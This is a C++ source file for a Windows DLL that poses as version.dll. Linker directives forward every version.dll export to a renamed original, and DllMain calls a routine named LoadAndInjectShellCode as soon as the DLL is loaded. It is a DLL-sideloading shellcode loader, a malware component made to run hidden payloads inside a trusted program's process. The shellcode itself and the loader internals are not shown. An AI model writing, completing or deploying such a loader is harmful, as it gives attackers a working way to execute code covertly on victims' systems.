#include <Windows.h>
#include <shlobj_core.h>
#include "Loader.h"
#include "Config.h"


#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "Shell32.lib")


#pragma comment(linker, "/export:GetFileVersionInfoA=default.GetFileVersionInfoA,@1")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=default.GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/export:GetFileVersionInfoExA=default.GetFileVersionInfoExA,@3")
#pragma comment(linker, "/export:GetFileVersionInfoExW=default.GetFileVersionInfoExW,@4")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=default.GetFileVersionInfoSizeA,@5")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=default.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=default.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=default.GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/export:GetFileVersionInfoW=default.GetFileVersionInfoW,@9")
#pragma comment(linker, "/export:VerFindFileA=default.VerFindFileA,@10")
#pragma comment(linker, "/export:VerFindFileW=default.VerFindFileW,@11")
#pragma comment(linker, "/export:VerInstallFileA=default.VerInstallFileA,@12")
#pragma comment(linker, "/export:VerInstallFileW=default.VerInstallFileW,@13")
#pragma comment(linker, "/export:VerLanguageNameA=default.VerLanguageNameA,@14")
#pragma comment(linker, "/export:VerLanguageNameW=default.VerLanguageNameW,@15")
#pragma comment(linker, "/export:VerQueryValueA=default.VerQueryValueA,@16")
#pragma comment(linker, "/export:VerQueryValueW=default.VerQueryValueW,@17")


VOID InitLoader(VOID)
{

    LoadAndInjectShellCode();
    

}

VOID ExportedFunction(VOID)
{
    InitLoader();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:

            InitLoader();
        
            break;

        case DLL_THREAD_ATTACH:

            break;

        case DLL_THREAD_DETACH:

            break;

        case DLL_PROCESS_DETACH:
        
            if (lpvReserved != nullptr)
            {
                break;
            }
            
            break;
    }
    return TRUE;
}
